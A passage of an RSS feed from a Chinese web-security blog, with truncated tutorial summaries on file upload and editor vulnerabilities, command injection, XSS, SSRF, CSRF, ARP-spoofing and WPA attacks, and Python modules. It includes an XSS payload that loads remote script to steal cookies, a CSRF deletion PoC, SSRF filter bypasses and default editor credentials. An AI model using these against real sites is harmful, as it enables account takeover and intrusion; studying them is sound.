0x05 漏洞可能代码(以system为例) 1. system(&amp;quot;$arg&amp;quot;); //直接输入即可 2. system(&amp;quot;/bin/prog $arg&amp;quot;); //直接输入;ls 3. system(&amp;quot;/bin/prog -p $arg&amp;quot;); //和2一样 4.</description>
    </item>
    
    <item>
      <title>文件上传之文本编辑器上传漏洞</title>
      <link>http://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Thu, 21 Jul 2016 15:11:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</guid>
      <description> 0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
0x01 FCKeditor 下面以FCKeditor(现名为CKEditor)为例：
1、敏感信息暴漏 * 查看版本信息 /FCKeditor/editor/dialog/fck_about.html * 默认上传页面 /FCKeditor/editor/filemanager/browser/default/browser.html /FCKeditor/editor/filemanager/browser/default/connectors/test.html /FCKeditor/editor/filemanager/upload/test.html /FCKeditor/editor/filemanager/connectors/test.html /FCKeditor/editor/filemanager/connectors/uploadtest.html * 其他敏感文件 /FCKeditor/editor/filemanager/connectors/aspx/connector.html /FCKeditor/editor/filemanager/connectors/asp/connector.html /FCKeditor/editor/filemanager/connectors/php/connector.php 2、黑名单策略错误 FCKeditor&amp;lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名 3、任意文件上传漏洞 FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行， 在form中的action=&amp;quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&amp;quot; 即可，然后上传  0x02 eWebEditor 1、默认后台 2.80以前为：ewebeditor/admin_login.asp 2.80以后为：admin/login.asp 2、默认账号密码 admin admin888 3、数据库地址 默认数据库地址 ewebeditor/db/ewebeditor.mdb 常用数据库地址 ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asa ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb asp asa为后缀的数据库下载下来后改为mdb  
Reference(侵删)：  http://navisec.it/编辑器漏洞手册/  </description>
    </item>
    
    <item>
      <title>文件上传漏洞常见绕过手法</title>
      <link>http://wyb0.com/posts/2016/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/file-upload-simple-to-bypass/</guid>
      <description>0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少 //服务器开销，而服务端验证才可以真正防御攻击者。 2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法  0x01 客户端检测 客户端验证代码形如下：
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;图片上传&amp;lt;/title&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function checkFile(){ var flag = false; var str = document.getElementById(&amp;quot;file&amp;quot;).value; str = str.substring(str.lastIndexOf(&#39;.&#39;) + 1); var arr = new Array(&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;); for (var i=0;i&amp;lt;arr.length;i++){ if(str==arr[i]){ flag = true; } } if(!flag){ alert(&#39;文件不合法！&#39;); } return flag; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; onsubmit=&amp;quot;checkFile()&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; name=&amp;quot;submit&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  接收文件的脚本upload.</description>
    </item>
    
    <item>
      <title>文件上传漏洞与文件解析漏洞</title>
      <link>http://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</guid>
      <description>0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。 # 上传后得到的权限 1. 后台权限：登陆了后台，可以进行一些操作、配置 2. 网站权限：获得了webshell，可以进行查看源代码等操作 3. 服务器权限：可以对服务器进行任意操作  0x01 文件上传漏洞分类 1. 配置不当可直接上传shell HTTP的PUT方法开启了 2. 文件解析漏洞导致文件执行 Web容器解析漏洞 3. 本地文件上传限制被绕过 BurpSuite抓包修改即可绕过 4. 服务端过滤不严或被绕过 使用了黑名单过滤 5. 文件路径截断上传 00截断等 6. 开源编辑器上传漏洞 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞  0x02 文件上传漏洞利用条件 1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径 2. 其次,用户能从web访问这个文件 3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败  0x03 文件上传漏洞挖掘 1. 查找上传点，如图片、附件、头像的上传等 2. 找类似upload的目录、类似upload.php的文件 3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等  0x04 常见可执行文件后缀 可用于绕过： php php2 php3 php5 phtml asp aspx ascx ashx cer asa jsp jspx jspf  0x05 解析漏洞 文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等  0x06 IIS解析漏洞 IIS6.</description>
    </item>
    
    <item>
      <title>虚拟机下安装vm-tools</title>
      <link>http://wyb0.com/posts/2016/vmware-install-vm-tools/</link>
      <pubDate>Wed, 20 Jul 2016 08:30:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/vmware-install-vm-tools/</guid>
      <description> vm-tools安装后可以在客户机和虚拟机间双向复制文件
0x00 安装 0x01 Kali2.0 一般安装的话按照上面的步骤即可安装成功，但是Kali2.0不行，可以用如下方法安装： 安装后可以终端输入：dpkg-reconfigure locales，在弹出的界面选择zh_CN.UTF-8设置语言为中文 可以用vim /root/.config/user-dirs.dirs将&amp;quot;桌面&amp;quot;修改为&amp;quot;Desktop&amp;quot;  </description>
    </item>
    
    <item>
      <title>一次存储型XSS利用实例</title>
      <link>http://wyb0.com/posts/2016/recording-an-stored-xss/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/recording-an-stored-xss/</guid>
      <description> 首先感谢凯神的指导
0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
    </item>
    
    <item>
      <title>XSS漏洞及其挖掘方法</title>
      <link>http://wyb0.com/posts/2016/xss-basis-and-use/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/xss-basis-and-use/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
 反射型XSS
  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</description>
    </item>
    
    <item>
      <title>Python的paramiko模块</title>
      <link>http://wyb0.com/posts/2016/python-module-paramiko/</link>
      <pubDate>Thu, 14 Jul 2016 15:24:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-paramiko/</guid>
      <description> 0x00 安装 直接pip install paramiko安装
或者去http://www.paramiko.org/ 下载
0x01 执行一条远程命令 #!/usr/bin/env python #-*- coding:utf-8 -*- import paramiko #远程执行命令 ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(&amp;quot;192.168.188.134&amp;quot;,22,&amp;quot;reber&amp;quot;,&amp;quot;123456&amp;quot;) ssh_session = ssh.get_transport().open_session() stdin,stdout,stderr = ssh.exec_command(&amp;quot;ls -l&amp;quot;) print stdin print stdout.readlines() #返回执行结果 print stderr.readlines() #有错误信息就返回错误信息，没有就返回空 ssh.close()  0x02 上传与下载文件 #!/usr/bin/env python #-*- coding:utf-8 -*- import paramiko ftp = paramiko.Transport((&amp;quot;192.168.188.134&amp;quot;,22)) ftp.connect(username=&amp;quot;reber&amp;quot;,password=&amp;quot;123456&amp;quot;) sftp = paramiko.SFTPClient.from_transport(ftp) #将本地的文件上传到服务端的/tmp/a.txt remotepath=&#39;/tmp/a.txt&#39; localpath=&#39;C:\\Users\\WYB_9\\Desktop\\a.txt&#39; sftp.put(localpath, remotepath) #将服务端的文件下载到C:\\Users\\WYB_9\\Desktop\\system.log remotepath=&#39;/tmp/a.txt&#39; localpath=&#39;C:\\Users\\WYB_9\\Desktop\\system.log&#39; sftp.get(remotepath, localpath) ftp.close()  </description>
    </item>
    
    <item>
      <title>Python的cmd模块</title>
      <link>http://wyb0.com/posts/2016/python-module-cmd/</link>
      <pubDate>Thu, 14 Jul 2016 09:44:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-cmd/</guid>
      <description>0x00 关于cmd模块 使用cmd模块创建的命令行解释器可以循环读取输入的所有行并且解析它们
0x01 cmd模块的一些常用方法：  cmdloop()：类似与Tkinter的mainloop，运行Cmd解析器 onecmd(str)：读取输入，并进行处理，通常不需要重载该函数，而是使用更加具体的do_command来执行特定的命名 emptyline()：当输入空行时调用该方法 default(line)：当无法识别输入的command时调用该方法 completedefault(text,line,begidx,endidx):如果不存在针对的complete_*()方法，那么会调用该函数 precmd(line)：命令line解析之前被调用该方法 postcmd(stop，line)：命令line解析之后被调用该方法 preloop()：cmdloop()运行之前调用该方法 postloop()：cmdloop()退出之后调用该方法  0x02 用cmd模块简单实现shell命令 #!/usr/bin/env python #-*- coding:utf-8 -*- import sys import os import socket from cmd import Cmd class ClassShell(Cmd): &amp;quot;&amp;quot;&amp;quot;docstring for ClassShell&amp;quot;&amp;quot;&amp;quot; def __init__(self): Cmd.__init__(self) os.chdir(&amp;quot;C:/Users/WYB_9/Desktop&amp;quot;) hostName = socket.gethostname() self.prompt = &amp;quot;reber@&amp;quot; + hostName + &amp;quot; &amp;quot; + os.path.abspath(&#39;.&#39;) + &amp;quot;\n$ &amp;quot; def help_dir(self): print &amp;quot;dir [path]&amp;quot; def do_dir(self, arg): if not arg: print &amp;quot;\n&amp;quot;.</description>
    </item>
    
    <item>
      <title>无线下ettercap做中间人攻击</title>
      <link>http://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link>
      <pubDate>Wed, 13 Jul 2016 09:22:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid>
      <description> 前提：攻击主机和被攻击主机在一个无线下面
0x00 打开ettercap 0x01 查看host列表 在软件的图形化界面点击sniff，选择unified sniffing选择网卡，然后单击hosts选项，选择scan for host，然后选择host list 0x02 选定攻击目标 选择192.168.1.116的IP地址，点击Add to Target 1,然后选择网关的IP地址192.168.1.1，点击Add to Target 2 0x03 开始攻击 ettercap选择&amp;quot;mitm&amp;quot;—&amp;quot;arp poisoning&amp;quot;—&amp;quot;Sniff remote connections&amp;quot;— &amp;quot;确定&amp;quot;，然后再在被攻击端查看arp，可知攻击已经成功 0x04 ettercap持续监听目标 软件上开始监听，被攻击端用浏览器登录路由器 0x05 得到Cookie 点击主界面的&amp;rdquo;View&amp;rdquo; — &amp;ldquo;connetcions&amp;rdquo; 可以查看被攻击主机的一些网络链接 0x06 用cookie登陆被入侵账户 打开火狐浏览器，通过firebug插件添加截获到的cookie从而登陆账户 </description>
    </item>
    
    <item>
      <title>攻击WPA保护下的802.11网络</title>
      <link>http://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</link>
      <pubDate>Wed, 13 Jul 2016 08:18:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</guid>
      <description>0x00 网络拓扑及信息 其中ip等信息如下： 0x01 获取信息  查看无线网卡并将其设置为监听模式  打开kismet，进行基本设置  选择名字为111111的AP为目标  查看kismet抓包信息 kismet生成的nettxt文件的部分信息如下：
  Network 104: BSSID D8:42:AC:C9:5C:1D Manuf : Shanghai First : Mon Nov 16 12:46:21 2015 Last : Mon Nov 16 13:10:23 2015 Type : infrastructure BSSID : D8:42:AC:C9:5C:1D SSID 1 Type : Probe Response SSID : &amp;quot;111111&amp;quot; First : Mon Nov 16 12:46:30 2015 Last : Mon Nov 16 13:10:22 2015 Max Rate : 54.</description>
    </item>
    
    <item>
      <title>Windows2003下搭建VPN</title>
      <link>http://wyb0.com/posts/2016/windows2003-set-up-vpn/</link>
      <pubDate>Thu, 07 Jul 2016 10:39:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows2003-set-up-vpn/</guid>
      <description> 0x00 环境及要求 Windows2003下搭建基于PPTP(点对点隧道协议)的VPN服务器
0x01 安装服务 0x02 配置并启用路由和远程访问 0x03 新增路由协议 0x04 新增接口 0x05 新增VPN用户 0x06 尝试连接VPN </description>
    </item>
    
    <item>
      <title>iptables简单配置DMZ</title>
      <link>http://wyb0.com/posts/2016/iptables-configure-dmz/</link>
      <pubDate>Tue, 05 Jul 2016 09:56:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/iptables-configure-dmz/</guid>
      <description>0x00 要求  内网可以访问外网 内网可以访问DMZ区 外网不能访问内网 外网能访问DMZ区的服务 DMZ区不能访问内网 DMZ区不能主动访问外网  0x01 拓扑 0x02 个主机IP信息 内网网段为：192.168.1.0/24
DMZ区网段为：172.16.1.0/24 0x03 iptables的策略 新建iptables.sh,内容如下：
#!/bin/bash iptables –F #清空此表中的规则 iptables –X #清空此表中的自定义规则 iptables –Z #清空此表中的计数器为0 iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP iptables -F -t nat iptables -X -t nat iptables -Z -t nat iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT iptables -t nat -P OUTPUT ACCEPT #添加必要的模块 modprobe ip_nat_ftp modprobe iptable_nat modprobe ip_conntrack modprobe ip_conntrack_ftp #开启转发功能 echo &amp;quot;1&amp;quot; &amp;gt; /proc/sys/net/ipv4/ip_forward #******************************************************************** #PREROUTING： iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination 172.</description>
    </item>
    
    <item>
      <title>Python简单解码IP头</title>
      <link>http://wyb0.com/posts/2016/python-simple-decode-ip-head/</link>
      <pubDate>Sun, 03 Jul 2016 20:06:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-simple-decode-ip-head/</guid>
      <description>0x00 解码IP头 Windows上运行时要以管理员身份运行
代码可以解码IP头统计通信信息并保存到文本，同时统计数量
#!/usr/bin/env python #-*- coding:utf-8 -*- import socket import os import sys import time import struct from ctypes import * host = &amp;quot;10.22.114.114&amp;quot; tcp_num = 0 udp_num = 0 icmp_num = 0 class IP(Structure): _fields_ = [ (&amp;quot;ihl&amp;quot;, c_ubyte,4), (&amp;quot;version&amp;quot;, c_ubyte,4), (&amp;quot;tos&amp;quot;, c_ubyte), (&amp;quot;len&amp;quot;, c_ushort), (&amp;quot;id&amp;quot;, c_ushort), (&amp;quot;offset&amp;quot;, c_ushort), (&amp;quot;ttl&amp;quot;, c_ubyte), (&amp;quot;protocol_num&amp;quot;,c_ubyte), (&amp;quot;sum&amp;quot;, c_ushort), (&amp;quot;src&amp;quot;, c_ulong), (&amp;quot;dst&amp;quot;, c_ulong) ] def __new__ (self,socket_buffer=None): return self.from_buffer_copy(socket_buffer) def __init__ (self,socket_buffer=None): self.</description>
    </item>
    
    <item>
      <title>Python的requests模块</title>
      <link>http://wyb0.com/posts/2016/python-module-requests/</link>
      <pubDate>Sat, 02 Jul 2016 10:47:19 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-requests/</guid>
      <description>0x00 无参数的get请求 import requests resp = requests.get(&#39;http://www.baidu.com&#39;,timeout=1) #设置超时，超时后抛出timeout错误 print resp.text #一般用来输出纯文本，可得到unicode类型字符串 print resp.content #一般用来输出pdf、图片等，可得到原网页设定类型的字符串  0x01 有参数的get请求 import requests url = &#39;http://10.10.10.10:8080/Lab2.0/Login.action&#39; header = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&#39;, } param = {&#39;aaa&#39;:&#39;1111&#39;,&#39;bbb&#39;:&#39;2222&#39;} resp = requests.get(url,params=param,headers=header) print resp.url #得到url print resp.status_code #得到返回的状态码 print resp.headers #得到html头 print resp.cookies #得到cookie  0x02 POST请求 import requests url1 = &#39;http://10.10.10.10:8080/Lab2.0/Login.action&#39; url2 = &#39;http://10.10.10.10:8080/Lab2.0/student.action&#39; data = { &#39;userid&#39;:&#39;1315935xxx&#39;, &#39;password&#39;:&#39;xxxxxxx&#39;, &#39;quan&#39;:&#39;Student&#39;, } header = { &#39;User-Agent&#39;: &#39;Mozilla/5.</description>
    </item>
    
    <item>
      <title>SSRF</title>
      <link>http://wyb0.com/posts/2016/ssrf/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ssrf/</guid>
      <description>0x00 什么是SSRF SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
0x01 SSRF的危害 可以扫描内部网络
可以构造数据攻击内部主机
0x02 漏洞挖掘 其实只要能对外发起网络请求就有可能存在SSRF漏洞。
1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain...  0x03 漏洞验证 http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。  0x04 绕过过滤 有时漏洞利用时会遇到IP限制，可用如下方法绕过：
* 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.10.0.0.1.xip.io = 10.0.0.1 foo.bar.10.0.0.1.xip.io = 10.0.0.1 * 通过js跳转  0x05 通用的SSRF实例  weblogin配置不当，天生ssrf漏洞 discuz x2.</description>
    </item>
    
    <item>
      <title>Python的编码问题</title>
      <link>http://wyb0.com/posts/2016/python-encode-setting/</link>
      <pubDate>Wed, 29 Jun 2016 15:14:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-encode-setting/</guid>
      <description>0x00 几个编码函数 * ord(x) 将字符转换为10进制整数(0~255之间) #ord(&#39;a&#39;)==&amp;gt;97 * chr(x) 将10进制整数(0~255之间)转换为字符 #chr(97)==&amp;gt;&#39;a&#39;，chr(0x61)==&amp;gt;&#39;a&#39; * b2a_hex(x) 将字符转换为对应的16进制 #import binascii;binascii.b2a_hex(&#39;a&#39;)==&amp;gt;&#39;61&#39; * a2b_hex(x) 将16进制转换为对应的字符 #import binascii;binascii.a2b_hex(&#39;61&#39;)==&amp;gt;&#39;a&#39; * hex(x) 将10进制整数转换为对应的16进制 #hex(16)==&amp;gt;&#39;0x10&#39; * oct(x) 将10进制整数转换为对应的8进制 #oct(9)==&amp;gt;&#39;011&#39;  0x01 设置为utf-8  在py文件开头设置
#!/usr/bin/env python #-*- coding: utf-8 -*- 或： #coding=utf8  永久编码(推荐) 可以在python安装路径下的Lib\site-packages下新建文件sitecustomize.py文件，内容如下：
#coding=utf8 import sys reload(sys) sys.setdefaultencoding(&#39;utf8&#39;) # 此方法修改了python环境，设置系统默认编码，永久有效   0x03 编码转换 python默认unicode为中间编码，所以无论是何种编码，解码时默认都解码为unicode
python2中的字符串一般包含两种类型：str和unicode str：str为ascii类型的字符串，utf-8、utf-16、GB2312、GBK等都是ascii类型的字符串 unicode：unicode编码的字符串才是unicode类型的字符串 可通过isinstance()和type()来判断 &amp;gt;&amp;gt;&amp;gt; aa = &#39;小明&#39; &amp;gt;&amp;gt;&amp;gt; isinstance(aa,str) True &amp;gt;&amp;gt;&amp;gt; type(aa) &amp;lt;type &#39;str&#39;&amp;gt; &amp;gt;&amp;gt;&amp;gt; bb = u&#39;小明&#39; &amp;gt;&amp;gt;&amp;gt; isinstance(bb,unicode) True &amp;gt;&amp;gt;&amp;gt; type(bb) &amp;lt;type &#39;unicode&#39;&amp;gt;  &amp;gt;&amp;gt;&amp;gt; u&#39;小明&#39;.</description>
    </item>
    
    <item>
      <title>sqlmapapi的简单使用</title>
      <link>http://wyb0.com/posts/2016/sqlmapapi-usage/</link>
      <pubDate>Tue, 28 Jun 2016 11:19:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/sqlmapapi-usage/</guid>
      <description>0x00 关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量
0x01 用于交互的方法 在sqlmap/lib/utils/api.py中:
# 用户方法 @get(&amp;quot;/task/new&amp;quot;) Create new task ID. @get(&amp;quot;/task/&amp;lt;taskid&amp;gt;/delete&amp;quot;) Delete own task ID. # 管理函数 @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/list&amp;quot;) List task pull. @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/flush&amp;quot;) Flush task spool (delete all tasks). # 核心交互函数 @get(&amp;quot;/option/&amp;lt;taskid&amp;gt;/list&amp;quot;) List options for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/get&amp;quot;) Get the value of an option (command line switch) for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/set&amp;quot;) Set an option (command line switch) for a certain task ID @post(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/start&amp;quot;) Launch a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/stop&amp;quot;) Kill a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/status&amp;quot;) Return status of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/data&amp;quot;) Retrieve the data of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log/&amp;lt;start&amp;gt;/&amp;lt;end&amp;gt;&amp;quot;) Retrieve a subset of log messages @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log&amp;quot;) Retrieve the log messages @get(&amp;quot;/download/&amp;lt;taskid&amp;gt;/&amp;lt;target&amp;gt;/&amp;lt;filename:path&amp;gt;&amp;quot;) Download a certain file from the file system  0x02 sqlmapapi.</description>
    </item>
    
    <item>
      <title>CSRF漏洞</title>
      <link>http://wyb0.com/posts/2016/csrf/</link>
      <pubDate>Tue, 28 Jun 2016 09:21:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/csrf/</guid>
      <description>0x00 概念 当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。
CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾认证过的网站并执行某些操作。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作
0x01 利用  利用条件
 攻击者可以得知url的所有参数项并了解其含义 诱导用户访问构造好的POC  利用地方
 操作是有意义的(比如:修改密码等) 验证过于简单(参数固定、我们可以设置参数)   0x02 GET型CSRF攻击 若有论坛www.aa.com，论坛删除文章的操作是请求类似 http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接  有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任  此时有hacker用户B，他构造了一个html为b.html，b.html内容如下： &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;img src=&amp;quot;http://www.aa.com/opt.php?id=251&amp;amp;act=del&amp;amp;name=A&amp;quot; /&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html  恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A， 诱使他访问，用户A一旦访问，他id为251的文章就会被删除  0x03 POST型CSRF攻击 若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图： &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form 